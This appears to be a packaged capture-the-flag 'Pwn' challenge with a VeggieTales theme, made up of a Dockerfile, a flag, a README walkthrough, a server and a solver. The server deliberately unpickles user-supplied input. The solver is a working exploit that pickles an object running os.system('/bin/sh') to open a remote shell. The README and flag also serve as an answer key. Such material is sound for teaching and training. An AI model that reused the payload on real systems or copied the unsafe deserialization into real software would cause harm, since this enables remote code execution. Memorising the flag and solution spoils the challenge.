{
    "Dockerfile": "FROM python:3.6.6-stretch\n\nRUN apt-get update && apt-get install -y \\\n    apt-utils \\\n    build-essential \\\n    socat\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY flag.txt /pwn/flag.txt\nCOPY server.py /pwn/server.py\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/server.py\nRUN chown pwnflag:pwnflag /pwn\n\nRUN chmod 4755 /pwn/server.py\nRUN chmod 444 /pwn/flag.txt\n\nEXPOSE 8448\nENTRYPOINT [\"su\",\"-c\",\"exec socat TCP-LISTEN:8448,reuseaddr,fork EXEC:/pwn/server.py,stderr\",\"-\",\"pwnuser\"]\n",
    "flag.txt": "gigem{d0nt_7rust_th3_g1ant_pick1e}\n",
    "README.md": "# VeggieTales\n## Challenge\nThis challenge requires players to investigate this server application for vulnerabilities.\nnc \\<IP\\> \\<port\\> \nHint: I've seen episode 5 at least 63 times.\n\n## Setup\nNote - Player is **NOT** given server side script\nBuild the docker file: `sudo docker build -t pickle .`\nRun the docker: `sudo docker run -p 9000:8448 pickle`\n\n\n## Solution\nsolver.py is an example of a working solution. Run using `python3 solver.py`\n1. Have the script create a backup and copy the string\n2. Do a rot13 on that string\n3. Decode the string using base64\n4. Figure out python is using pickle to save the state of the watchlist\n5. Write and pickle a malicious python object that runs '/bin/sh' when unpickled\n6. Encode the pickled object string in base64\n7. Do a rot13 on the string\n8. Enter the string in the area to load your watchlist.\n8. cat flag.txt\n",
    "server.py": "#!/usr/bin/env python3\nimport base64, string, pickle, codecs\n\nmy_episodes = []\nall_episodes = [\"1.  Wheres God When Im S-Scared?\",\"2.  God Wants Me to Forgive Them!?!\",\"3.  Are You My Neighbor?\",\"4.  Rack, Shack and Benny\",\"5.  Dave and the Giant Pickle\",\"6.  The Toy That Saved Christmas\",\"7.  Larry-Boy! And the Fib from Outer Space!\",\"8.  Josh and the Big Wall!\",\"9.  Madame Blueberry\",\"10. Larry-Boy and the Rumor Weed\",\"11. King George and the Ducky\",\"12. Esther... The Girl Who Became Queen\",\"13. Lyle the Kindly Viking\",\"14. The Star of Christmas\",\"15. The Wonderful World of Autotainment\",\"16. The Ballad of Little Joe\",\"17. An Easter Carol\",\"18. A Snoodles Tale\",\"19. Sumo of the Opera\",\"20. Duke and the Great Pie War\",\"21. Minnesota Cuke and the Search for Samsons Hairbrush\",\"22. Lord of the Beans\",\"23. Sheerluck Holmes and the Golden Ruler\",\"24. LarryBoy and the Bad Apple\",\"25. Gideon: Tuba Warrior\",\"26. Moe and the Big Exit\",\"27. The Wonderful Wizard of Has\",\"28. Tomato Sawyer and Huckleberry Larrys Big River Rescue\",\"29. Abe and the Amazing Promise\",\"30. Minnesota Cuke and the Search for Noahs Umbrella\",\"31. Saint Nicholas: A Story of Joyful Giving\",\"32. Pistachio - The Little Boy That Woodnt\",\"33. Sweetpea Beauty: A Girl After Gods Own Heart\",\"34. Its a Meaningful Life\",\"35. Twas The Night Before Easter\",\"36. Princess and the Popstar\",\"37. The Little Drummer Boy\",\"38. Robin Good And His Not-So Merry Men\",\"39. The Penniless Princess\",\"40. The League of Incredible Vegetables\",\"41. The Little House That Stood\",\"42. MacLarry and the Stinky Cheese Battle\",\"43. Merry Larry and the True Light of Christmas\",\"44. Veggies in Space: The Fennel Frontier\",\"45. Celery Night Fever\",\"46. Beauty and the Beet\",\"47. Noahs Ark\"] \n\ndef sortByNum(episode):\n    return int(episode[:episode.find('.')])\n\ndef add_episode():\n    for episode in all_episodes:\n        print(\"%s\" % episode)\n    episode_num = str(input(\"Enter an episode (by number) to add to your watched list: \"))\n    while not (episode_num.isdigit() and (0 < int(episode_num) < 48)):\n        episode_num = str(input(\"Enter a valid integer between 1 and 47!!\"))\n    if all_episodes[int(episode_num)-1] in my_episodes:\n        print(\"That episode is already in your list.\")\n    else:\n        my_episodes.append(all_episodes[int(episode_num)-1])\n        print(\"episode added!\")\n    my_episodes.sort(key=sortByNum)\n\ndef check_list():\n    print(\"----------------------\")\n    print(\"List of watched episodes:\")\n    if len(my_episodes) == 0:\n        print(\":(\")\n    for episode in my_episodes:\n        print(\"%s\" % episode)\n    print(\"----------------------\")\n\n\ndef backup_list():\n    pickled = codecs.encode(str(base64.b64encode(pickle.dumps(my_episodes))),\"rot-13\").strip(\"o\\'\")\n    print(\"Episode list backup string (Don't lose it!): %s\\n\" % pickled)\n\ndef load_list():\n    answer = str(input(\"Load your backed up list here: \"))\n    try:\n        global my_episodes\n        my_episodes = pickle.loads(base64.b64decode(codecs.encode(answer,\"rot-13\")))\n        print(\"Loaded backup\\n\")\n    except:\n        print(\"Invalid backup\")\n\nif __name__ == \"__main__\":\n    print(\"Do you like VeggieTales??\")\n    message = \"1. Add an episode to your watched list\\n2. Print your watch list\\n3. Backup your watch list\\n4. Load your watch list\\n\"\n    while True:\n        listen = str(input(message))\n        if len(listen) == 1 and listen in \"1234\":\n            [add_episode, check_list, backup_list, load_list][int(listen) - 1]()\n            message = \"1. Add an episode to your watched list\\n2. Print your watch list\\n3. Backup your watch list\\n4. Load your watch list\\n\"\n        else:\n            message = \"Error: Please choose from options 1-4!!\\n\"\n",
    "solver.py": "from pwn import *\nimport pickle\nimport os\nimport base64\nimport codecs\n\nclass WIN(object):\n    def __reduce__(self):\n        return (os.system, ('/bin/sh', ))\n\npayload = codecs.encode(str(base64.b64encode(pickle.dumps(WIN()))),\"rot-13\").strip(\"o\\'\")\np = remote('127.0.0.1',9000)\np.recvuntil('4.')\np.recvline()\np.send('4\\n')\np.send(payload + '\\n')\np.interactive()\n",
    "category": "Pwn"
}